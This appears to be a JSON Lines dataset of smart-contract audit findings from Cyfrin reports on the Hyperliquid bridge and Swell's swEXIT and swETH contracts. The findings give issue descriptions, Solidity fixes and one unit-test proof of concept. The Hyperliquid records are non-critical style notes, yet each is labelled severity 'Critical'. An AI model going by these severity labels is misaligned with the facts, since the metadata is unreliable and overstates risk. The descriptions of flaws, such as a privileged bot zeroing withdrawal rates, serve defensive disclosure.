{"schema_version": "0.1", "scvd_id": "SCVD-cyfrin_2023-04-11-cyfrin-hyperliquid-dex-report-011", "doc_id": "cyfrin_2023-04-11-cyfrin-hyperliquid-dex-report", "finding_index": 11, "page_start": null, "title": "[NC-09] No need to explicitly initialize variables to 0", "short_summary": null, "description_md": null, "full_markdown": "## [NC-09] No need to explicitly initialize variables to 0\n\nVariables are initalized to 0 by default in Solidity, so a [number](https://github.com/hyperliquid-dex/contracts/blob/e0aff464865aa98c09450702d7fb36b1fcd4508c/Bridge.sol#L169-L170) of [superfluous](https://github.com/hyperliquid-dex/contracts/blob/e0aff464865aa98c09450702d7fb36b1fcd4508c/Bridge.sol#L173) [assigments](https://github.com/hyperliquid-dex/contracts/blob/e0aff464865aa98c09450702d7fb36b1fcd4508c/Bridge.sol#L236-L237) can be removed.\n\n### `f045dbf` Resolution\n\nSuperfluous assignments have been removed.\n", "severity": "Critical", "difficulty": null, "type": null, "finding_id": "NC-09", "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/hyperliquid-dex/contracts", "org": "hyperliquid-dex", "name": "contracts", "commit": "e0aff464865aa98c09450702d7fb36b1fcd4508c", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2023-04-11-cyfrin-hyperliquid-dex-report.md", "source_mtime": "2025-11-01T12:04:59+00:00", "report_extracted_at": "2025-11-12T02:04:23.909351+00:00", "report_extractor_version": "poc-0.4-md-no-llm", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:04:23.910178+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Critical", "Difficulty": null, "Type": null, "Finding ID": "NC-09", "Target": null}}
{"schema_version": "0.1", "scvd_id": "SCVD-cyfrin_2023-04-11-cyfrin-hyperliquid-dex-report-012", "doc_id": "cyfrin_2023-04-11-cyfrin-hyperliquid-dex-report", "finding_index": 12, "page_start": null, "title": "[NC-10] Use addition assignment operator", "short_summary": null, "description_md": null, "full_markdown": "## [NC-10] Use addition assignment operator\n\nThe addition assignment operator `+=` can be used when [checking new validator powers](https://github.com/hyperliquid-dex/contracts/blob/e0aff464865aa98c09450702d7fb36b1fcd4508c/Bridge.sol#L238).\n\n### `f045dbf` Resolution\n\nThe addition assignment operator has been used.\n", "severity": "Critical", "difficulty": null, "type": null, "finding_id": "NC-10", "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/hyperliquid-dex/contracts", "org": "hyperliquid-dex", "name": "contracts", "commit": "e0aff464865aa98c09450702d7fb36b1fcd4508c", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2023-04-11-cyfrin-hyperliquid-dex-report.md", "source_mtime": "2025-11-01T12:04:59+00:00", "report_extracted_at": "2025-11-12T02:04:23.909351+00:00", "report_extractor_version": "poc-0.4-md-no-llm", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:04:23.910178+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Critical", "Difficulty": null, "Type": null, "Finding ID": "NC-10", "Target": null}}
{"schema_version": "0.1", "scvd_id": "SCVD-cyfrin_2023-04-11-cyfrin-hyperliquid-dex-report-013", "doc_id": "cyfrin_2023-04-11-cyfrin-hyperliquid-dex-report", "finding_index": 13, "page_start": null, "title": "[NC-11] Localhost chain id can be 1337 or 31337", "short_summary": null, "description_md": null, "full_markdown": "## [NC-11] Localhost chain id can be 1337 or 31337\n\nThe default localhost chain id for some frameworks (e.g. HardHat) is `31337` rather than `1337`. For example, it is not possible to run signature tests using forge without changing `Signature::LOCALHOST_CHAIN_ID` to `31337`.\n\n### `f045dbf` Resolution\n\nThis has been resolved by the resolution of NC-12.\n", "severity": "Critical", "difficulty": null, "type": null, "finding_id": "NC-11", "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/hyperliquid-dex/contracts", "org": "hyperliquid-dex", "name": "contracts", "commit": "e0aff464865aa98c09450702d7fb36b1fcd4508c", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2023-04-11-cyfrin-hyperliquid-dex-report.md", "source_mtime": "2025-11-01T12:04:59+00:00", "report_extracted_at": "2025-11-12T02:04:23.909351+00:00", "report_extractor_version": "poc-0.4-md-no-llm", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:04:23.910178+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Critical", "Difficulty": null, "Type": null, "Finding ID": "NC-11", "Target": null}}
{"schema_version": "0.1", "scvd_id": "SCVD-cyfrin_2023-04-11-cyfrin-hyperliquid-dex-report-014", "doc_id": "cyfrin_2023-04-11-cyfrin-hyperliquid-dex-report", "finding_index": 14, "page_start": null, "title": "[NC-12] Rename to DOMAIN_SEPARATOR and use `block.chainId` directly", "short_summary": null, "description_md": null, "full_markdown": "## [NC-12] Rename to DOMAIN_SEPARATOR and use `block.chainId` directly\n\nReferences to `*_DOMAIN_HASH` in `Signature` should be renamed to `*_DOMAIN_SEPARATOR` to be more consistent with the EIP and avoid confusion. Additionally, it is recommended to use `block.chainId` directly, caching on contract creation and only recomputing the domain separator if the chain id changes, removing the need for multiple different separators to be defined.\n\n### `f045dbf` Resolution\n\nThe client team has removed the domain separator contants in favour of a single `EIP712_DOMAIN_SEPARATOR` constant with the following comment in response to the Cyfrin team's comment about recomputing the domain separator if the chain id changes:\n\n> Hard fork concern potentially just an edge case not worth thinking about.\n", "severity": "Critical", "difficulty": null, "type": null, "finding_id": "NC-12", "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/hyperliquid-dex/contracts", "org": "hyperliquid-dex", "name": "contracts", "commit": "e0aff464865aa98c09450702d7fb36b1fcd4508c", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2023-04-11-cyfrin-hyperliquid-dex-report.md", "source_mtime": "2025-11-01T12:04:59+00:00", "report_extracted_at": "2025-11-12T02:04:23.909351+00:00", "report_extractor_version": "poc-0.4-md-no-llm", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:04:23.910178+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Critical", "Difficulty": null, "Type": null, "Finding ID": "NC-12", "Target": null}}
{"schema_version": "0.1", "scvd_id": "SCVD-cyfrin_2023-04-11-cyfrin-hyperliquid-dex-report-015", "doc_id": "cyfrin_2023-04-11-cyfrin-hyperliquid-dex-report", "finding_index": 15, "page_start": null, "title": "[NC-13] Rename to `EIP712_DOMAIN_TYPEHASH`", "short_summary": null, "description_md": null, "full_markdown": "## [NC-13] Rename to `EIP712_DOMAIN_TYPEHASH`\n\nAdd an [additional underscore](https://github.com/hyperliquid-dex/contracts/blob/e0aff464865aa98c09450702d7fb36b1fcd4508c/Signature.sol#L19) for readability.\n\n### `f045dbf` Resolution\n\nThe constant has been renamed to `EIP712_DOMAIN_TYPEHASH`.\n", "severity": "Critical", "difficulty": null, "type": null, "finding_id": "NC-13", "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/hyperliquid-dex/contracts", "org": "hyperliquid-dex", "name": "contracts", "commit": "e0aff464865aa98c09450702d7fb36b1fcd4508c", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2023-04-11-cyfrin-hyperliquid-dex-report.md", "source_mtime": "2025-11-01T12:04:59+00:00", "report_extracted_at": "2025-11-12T02:04:23.909351+00:00", "report_extractor_version": "poc-0.4-md-no-llm", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:04:23.910178+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Critical", "Difficulty": null, "Type": null, "Finding ID": "NC-13", "Target": null}}
{"schema_version": "0.1", "scvd_id": "SCVD-cyfrin_2023-04-11-cyfrin-hyperliquid-dex-report-016", "doc_id": "cyfrin_2023-04-11-cyfrin-hyperliquid-dex-report", "finding_index": 16, "page_start": null, "title": "[NC-14] Include `byte32 salt` in domain typehash", "short_summary": null, "description_md": null, "full_markdown": "## [NC-14] Include `byte32 salt` in domain typehash\n\nPer the [EIP](https://eips.ethereum.org/EIPS/eip-712), `bytes32 salt` should be added to the [domain separator](https://github.com/hyperliquid-dex/contracts/blob/e0aff464865aa98c09450702d7fb36b1fcd4508c/Signature.sol#L20) as a last-resort means to distinguish this application from others. Whilst it is unlikely that there would be signatures generated for other contracts that could be replayed onto the bridge, inclusion of a salt gives additional security assurances for little additional overhead.\n\n### `f045dbf` Resolution\n\nThe client team acknowledges this finding with the following comment:\n\n> We don’t think this is a useful change. Since only the validators generate these signatures for the bridge, we do not need to worry about the events being replayed on other smart contracts. Also, including `byte32 salt` causes problems when generating signatures using the rust client code.\n", "severity": "Critical", "difficulty": null, "type": null, "finding_id": "NC-14", "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/hyperliquid-dex/contracts", "org": "hyperliquid-dex", "name": "contracts", "commit": "e0aff464865aa98c09450702d7fb36b1fcd4508c", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2023-04-11-cyfrin-hyperliquid-dex-report.md", "source_mtime": "2025-11-01T12:04:59+00:00", "report_extracted_at": "2025-11-12T02:04:23.909351+00:00", "report_extractor_version": "poc-0.4-md-no-llm", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:04:23.910178+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Critical", "Difficulty": null, "Type": null, "Finding ID": "NC-14", "Target": null}}
{"schema_version": "0.1", "scvd_id": "SCVD-cyfrin_2023-04-11-cyfrin-hyperliquid-dex-report-017", "doc_id": "cyfrin_2023-04-11-cyfrin-hyperliquid-dex-report", "finding_index": 17, "page_start": null, "title": "[NC-15] Verifying contract TODO", "short_summary": null, "description_md": null, "full_markdown": "## [NC-15] Verifying contract TODO\n\nUpdate the [verifying contract address](https://github.com/hyperliquid-dex/contracts/blob/e0aff464865aa98c09450702d7fb36b1fcd4508c/Signature.sol#L25).\n\n### `f045dbf` Resolution\n\nThe client team acknowledges this finding with the following comment:\n\n> Removed the TODO. Keeping the verifying address as the zero address, though slightly confusing, is more convenient for us and has no significant drawbacks.\n", "severity": "Critical", "difficulty": null, "type": null, "finding_id": "NC-15", "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/hyperliquid-dex/contracts", "org": "hyperliquid-dex", "name": "contracts", "commit": "e0aff464865aa98c09450702d7fb36b1fcd4508c", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2023-04-11-cyfrin-hyperliquid-dex-report.md", "source_mtime": "2025-11-01T12:04:59+00:00", "report_extracted_at": "2025-11-12T02:04:23.909351+00:00", "report_extractor_version": "poc-0.4-md-no-llm", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:04:23.910178+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Critical", "Difficulty": null, "Type": null, "Finding ID": "NC-15", "Target": null}}
{"schema_version": "0.1", "scvd_id": "SCVD-cyfrin_2024-02-23-cyfrin-swell-barracuda-001", "doc_id": "cyfrin_2024-02-23-cyfrin-swell-barracuda", "finding_index": 1, "page_start": null, "title": "`SwellLib.BOT` can delete active validators when bot methods are paused", "short_summary": null, "description_md": null, "full_markdown": "### `SwellLib.BOT` can delete active validators when bot methods are paused\n\n**Description:** Almost all of the functions callable by `SwellLib.BOT` contain the following check to prevent bot functions from working when bot methods are paused:\n\n```solidity\nif (AccessControlManager.botMethodsPaused()) {\n  revert SwellLib.BotMethodsPaused();\n}\n```\n\nThe one exception is [`NodeOperatorRegistry::deleteActiveValidators`](https://github.com/SwellNetwork/v3-contracts-lst/tree/a95ea7942ba895ae84845ab7fec1163d667bee38/contracts/implementations/NodeOperatorRegistry.sol#L417-L423) which is callable by `SwellLib.BOT` even when bot methods are paused. Consider:\n* adding a similar check to this function such that `SwellLib.BOT` is not able to call it when bot methods are paused\n* alternatively add an explicit comment to this function stating that it should be callable by `SwellLib.BOT` even when bot methods are paused.\n\nOne possible implementation for the first solution:\n```solidity\nbool isBot = AccessControlManager.hasRole(SwellLib.BOT, msg.sender);\n\n// prevent bot from calling this function when bot methods are paused\nif(isBot && AccessControlManager.botMethodsPaused()) {\n  revert SwellLib.BotMethodsPaused();\n}\n\n// function only callable by admin & bot\nif (!AccessControlManager.hasRole(SwellLib.PLATFORM_ADMIN, msg.sender) && !isBot) {\n  revert OnlyPlatformAdminOrBotCanDeleteActiveValidators();\n}\n```\n\n**Swell:** Fixed in commit [1a105b7](https://github.com/SwellNetwork/v3-contracts-lst/commit/1a105b76899780e30b1fb88abdede11c0c0586ba).\n\n**Cyfrin:**\nVerified.\n", "severity": "Medium", "difficulty": null, "type": null, "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/SwellNetwork/v3-contracts-lst", "org": "SwellNetwork", "name": "v3-contracts-lst", "commit": "a95ea7942ba895ae84845ab7fec1163d667bee38", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2024-02-23-cyfrin-swell-barracuda.md", "source_mtime": "2025-11-01T12:04:59+00:00", "report_extracted_at": "2025-11-12T02:04:23.914761+00:00", "report_extractor_version": "poc-0.4-md-no-llm", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:04:23.915871+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Medium", "Difficulty": null, "Type": null, "Finding ID": null, "Target": null}}
{"schema_version": "0.1", "scvd_id": "SCVD-cyfrin_2024-02-23-cyfrin-swell-barracuda-002", "doc_id": "cyfrin_2024-02-23-cyfrin-swell-barracuda", "finding_index": 2, "page_start": null, "title": "`SwellLib.BOT` can subtly rug-pull withdrawals by setting `_processedRate = 0` when calling `swEXIT::processWithdrawals`", "short_summary": null, "description_md": null, "full_markdown": "### `SwellLib.BOT` can subtly rug-pull withdrawals by setting `_processedRate = 0` when calling `swEXIT::processWithdrawals`\n\n**Description:** When users create a withdrawal request, their `swETH` is [burned](https://github.com/SwellNetwork/v3-contracts-lst/blob/a95ea7942ba895ae84845ab7fec1163d667bee38/contracts/implementations/swEXIT.sol#L202-L205) then the current exchange rate `rateWhenCreated` is [fetched](https://github.com/SwellNetwork/v3-contracts-lst/tree/a95ea7942ba895ae84845ab7fec1163d667bee38/contracts/implementations/swEXIT.sol#L213) from `swETH::swETHToETHRate`:\n```solidity\nuint256 rateWhenCreated = AccessControlManager.swETH().swETHToETHRate();\n```\n\nHowever `SwellLib.BOT` can [pass an arbitrary value](https://github.com/SwellNetwork/v3-contracts-lst/tree/a95ea7942ba895ae84845ab7fec1163d667bee38/contracts/implementations/swEXIT.sol#L111) for `_processedRate` when calling `swEXIT::processWithdrawals`:\n```solidity\nfunction processWithdrawals(\n  uint256 _lastTokenIdToProcess,\n  uint256 _processedRate\n) external override checkRole(SwellLib.BOT) {\n```\n\nThe [final rate](https://github.com/SwellNetwork/v3-contracts-lst/tree/a95ea7942ba895ae84845ab7fec1163d667bee38/contracts/implementations/swEXIT.sol#L150-L152) used is the lesser of `rateWhenCreated` and `_processedRate`:\n```solidity\nuint256 finalRate = _processedRate > rateWhenCreated\n  ? rateWhenCreated\n  : _processedRate;\n```\n\nThis final rate is [multiplied](https://github.com/SwellNetwork/v3-contracts-lst/tree/a95ea7942ba895ae84845ab7fec1163d667bee38/contracts/implementations/swEXIT.sol#L158) by the requested withdrawal amount to determine the actual amount sent to the user requesting a withdrawal:\n```solidity\nuint256 requestExitedETH = wrap(amount).mul(wrap(finalRate)).unwrap();\n```\n\nHence `SwellLib.BOT` can subtly rug-pull all withdrawals by setting `_processedRate = 0` when calling `swEXIT::processWithdrawals`.\n\n**Recommended Mitigation:** Two possible mitigations:\n1) Change `swEXIT::processWithdrawals` to always fetch the current rate from `swETH::swETHToETHRate`\n2) Only allow `swEXIT::processWithdrawals` to be called by the `RepricingOracle` contract which [calls it correctly](https://github.com/SwellNetwork/v3-contracts-lst/tree/a95ea7942ba895ae84845ab7fec1163d667bee38/contracts/implementations/RepricingOracle.sol#L130-L132).\n\n**Swell:** Fixed in commits [c6f8708](https://github.com/SwellNetwork/v3-contracts-lst/commit/c6f870847bdf276aee1bf9aeb1ed71771a2aba04), [64cfbdb](https://github.com/SwellNetwork/v3-contracts-lst/commit/64cfbdbf67e28d84f2a706982e28925ab51fd5e6).\n\n**Cyfrin:**\nVerified.\n\n\\clearpage\n", "severity": "Medium", "difficulty": null, "type": null, "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/SwellNetwork/v3-contracts-lst", "org": "SwellNetwork", "name": "v3-contracts-lst", "commit": "a95ea7942ba895ae84845ab7fec1163d667bee38", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2024-02-23-cyfrin-swell-barracuda.md", "source_mtime": "2025-11-01T12:04:59+00:00", "report_extracted_at": "2025-11-12T02:04:23.914761+00:00", "report_extractor_version": "poc-0.4-md-no-llm", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:04:23.915871+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Medium", "Difficulty": null, "Type": null, "Finding ID": null, "Target": null}}
{"schema_version": "0.1", "scvd_id": "SCVD-cyfrin_2024-02-23-cyfrin-swell-barracuda-003", "doc_id": "cyfrin_2024-02-23-cyfrin-swell-barracuda", "finding_index": 3, "page_start": null, "title": "Precision loss in `swETH::reprice` from unnecessary division before multiplication", "short_summary": null, "description_md": null, "full_markdown": "### Precision loss in `swETH::reprice` from unnecessary division before multiplication\n\n**Description:** `swETH::reprice` [L281-286](https://github.com/SwellNetwork/v3-contracts-lst/tree/a95ea7942ba895ae84845ab7fec1163d667bee38/contracts/implementations/swETH.sol#L281-L286) performs unnecessary [division before multiplication](https://dacian.me/precision-loss-errors#heading-division-before-multiplication) when calculating node operator rewards which negatively impacts node operator rewards due to precision loss:\n\n```solidity\nUD60x18 nodeOperatorRewardPortion = wrap(nodeOperatorRewardPercentage)\n  .div(wrap(rewardPercentageTotal));\n\nnodeOperatorRewards = nodeOperatorRewardPortion\n  .mul(rewardsInSwETH) // @audit mult after division\n  .unwrap();\n```\n\nRefactor to perform division after multiplication:\n\n```solidity\nnodeOperatorRewards = wrap(nodeOperatorRewardPercentage)\n  .mul(rewardsInSwETH)\n  .div(wrap(rewardPercentageTotal))\n  .unwrap();\n```\n\nA similar issue occurs when calculating operators reward share [L310-313](https://github.com/SwellNetwork/v3-contracts-lst/tree/a95ea7942ba895ae84845ab7fec1163d667bee38/contracts/implementations/swETH.sol#L310-L313):\n\n```solidity\nuint256 operatorsRewardShare = wrap(operatorActiveValidators)\n  .div(totalActiveValidators)\n  .mul(wrap(nodeOperatorRewards)) // @audit mult after division\n  .unwrap();\n```\n\nThis can be similarly refactored to prevent the precision loss by performing multiplication first:\n\n```solidity\nuint256 operatorsRewardShare = wrap(operatorActiveValidators)\n  .mul(wrap(nodeOperatorRewards))\n  .div(totalActiveValidators)\n  .unwrap();\n```\n\nThis issue has not been introduced in the new changes but is in the mainnet code ([1](https://github.com/SwellNetwork/v3-core-public/blob/master/contracts/lst/contracts/implementations/swETH.sol#L267-L272), [2](https://github.com/SwellNetwork/v3-core-public/blob/master/contracts/lst/contracts/implementations/swETH.sol#L296-L299)).\n\nThere is still one potential precision loss remaining as `rewardsInSwETH` which has had a [division performed](https://github.com/SwellNetwork/v3-contracts-lst/tree/a95ea7942ba895ae84845ab7fec1163d667bee38/contracts/implementations/swETH.sol#L239) then gets [multiplied](https://github.com/SwellNetwork/v3-contracts-lst/tree/a95ea7942ba895ae84845ab7fec1163d667bee38/contracts/implementations/swETH.sol#L285) but attempting to refactor this out resulted in a \"stack too deep\" error so it may be unavoidable.\n\n**Swell:** Acknowledged.\n", "severity": "Low", "difficulty": null, "type": null, "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/SwellNetwork/v3-contracts-lst", "org": "SwellNetwork", "name": "v3-contracts-lst", "commit": "a95ea7942ba895ae84845ab7fec1163d667bee38", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2024-02-23-cyfrin-swell-barracuda.md", "source_mtime": "2025-11-01T12:04:59+00:00", "report_extracted_at": "2025-11-12T02:04:23.914761+00:00", "report_extractor_version": "poc-0.4-md-no-llm", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:04:23.915871+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Low", "Difficulty": null, "Type": null, "Finding ID": null, "Target": null}}
{"schema_version": "0.1", "scvd_id": "SCVD-cyfrin_2024-02-23-cyfrin-swell-barracuda-004", "doc_id": "cyfrin_2024-02-23-cyfrin-swell-barracuda", "finding_index": 4, "page_start": null, "title": "`swEXIT::setWithdrawRequestMaximum` and `setWithdrawRequestMinimum` lacking validation can lead to a state where `withdrawRequestMinimum > withdrawRequestMaximum`", "short_summary": null, "description_md": null, "full_markdown": "### `swEXIT::setWithdrawRequestMaximum` and `setWithdrawRequestMinimum` lacking validation can lead to a state where `withdrawRequestMinimum > withdrawRequestMaximum`\n\n**Description:** Invariant `withdrawRequestMinimum <= withdrawRequestMaximum` must always hold, however this is not checked when new min/max withdraw values are set. Hence it is possible to enter a non-sensical state where `withdrawRequestMinimum > withdrawRequestMaximum`.\n\n**Recommended mitigation:**\n```diff\n  function setWithdrawRequestMaximum(\n    uint256 _withdrawRequestMaximum\n  ) external override checkRole(SwellLib.PLATFORM_ADMIN) {\n+   require(withdrawRequestMinimum <= _withdrawRequestMaximum);\n\n    emit WithdrawalRequestMaximumUpdated(\n      withdrawRequestMaximum,\n      _withdrawRequestMaximum\n    );\n    withdrawRequestMaximum = _withdrawRequestMaximum;\n  }\n\n  function setWithdrawRequestMinimum(\n    uint256 _withdrawRequestMinimum\n  ) external override checkRole(SwellLib.PLATFORM_ADMIN) {\n+   require(_withdrawRequestMinimum <= withdrawRequestMaximum);\n\n    emit WithdrawalRequestMinimumUpdated(\n      withdrawRequestMinimum,\n      _withdrawRequestMinimum\n    );\n    withdrawRequestMinimum = _withdrawRequestMinimum;\n  }\n```\n\n**Swell:** Fixed in commit [a9dfe5c](https://github.com/SwellNetwork/v3-contracts-lst/commit/a9dfe5cef35404e4e957e8001d571b1cf43feb0a).\n\n**Cyfrin:**\nVerified.\n", "severity": "Low", "difficulty": null, "type": null, "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/SwellNetwork/v3-contracts-lst", "org": "SwellNetwork", "name": "v3-contracts-lst", "commit": "a95ea7942ba895ae84845ab7fec1163d667bee38", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2024-02-23-cyfrin-swell-barracuda.md", "source_mtime": "2025-11-01T12:04:59+00:00", "report_extracted_at": "2025-11-12T02:04:23.914761+00:00", "report_extractor_version": "poc-0.4-md-no-llm", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:04:23.915871+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Low", "Difficulty": null, "Type": null, "Finding ID": null, "Target": null}}
{"schema_version": "0.1", "scvd_id": "SCVD-cyfrin_2024-02-23-cyfrin-swell-barracuda-005", "doc_id": "cyfrin_2024-02-23-cyfrin-swell-barracuda", "finding_index": 5, "page_start": null, "title": "`swExit::getProcessedRateForTokenId` returns `true` with valid `processedRate` for non-existent `tokenId` input", "short_summary": null, "description_md": null, "full_markdown": "### `swExit::getProcessedRateForTokenId` returns `true` with valid `processedRate` for non-existent `tokenId` input\n\n**Description:** `swExit::getProcessedRateForTokenId` returns `true` with valid `processedRate` for non-existent `tokenId` input.\n\n**Impact:** This `public` function can return valid output for invalid input. Currently it only appears to be used by `finalizeWithdrawal` where this behavior does not seem to be further exploitable as that function checks for non-existent tokens before calling `getProcessedRateForTokenId`.\n\n**Proof of Concept:** Add the following PoC to `getProcessedRateForTokenId.test.ts`:\n```typescript\n  it(\"Should return false for isProcessed when tokens have been processed but this token doesn't exist\", async () => {\n    await createWithdrawRequests(Deployer, 5);\n\n    await swEXIT_Deployer.processWithdrawals(4, parseEther(\"1\"));\n\n    // @audit this test fails\n    expect(await getProcessedRateForTokenId(0)).eql({\n      isProcessed: false,               // @audit returns true\n      processedRate: BigNumber.from(0), // @audit returns > 0\n    });\n  });\n```\n\n**Recommended Mitigation:** `swExit::getProcessedRateForTokenId` should `return(false, 0)` when `tokenId` doesn't exist. It appears that the only edge case which is currently unhandled by this function is when `tokenId = 0`.\n\n**Swell:** Fixed in commits [4c8cbfd](https://github.com/SwellNetwork/v3-contracts-lst/commit/4c8cbfde6fdb54385f8bab83c33f90409fd0a412), [262db73](https://github.com/SwellNetwork/v3-contracts-lst/commit/262db7361f543611237e889313b8022a47b77144).\n\n**Cyfrin:**\nVerified.\n", "severity": "Low", "difficulty": null, "type": null, "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/SwellNetwork/v3-contracts-lst", "org": "SwellNetwork", "name": "v3-contracts-lst", "commit": "a95ea7942ba895ae84845ab7fec1163d667bee38", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2024-02-23-cyfrin-swell-barracuda.md", "source_mtime": "2025-11-01T12:04:59+00:00", "report_extracted_at": "2025-11-12T02:04:23.914761+00:00", "report_extractor_version": "poc-0.4-md-no-llm", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:04:23.915871+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Low", "Difficulty": null, "Type": null, "Finding ID": null, "Target": null}}
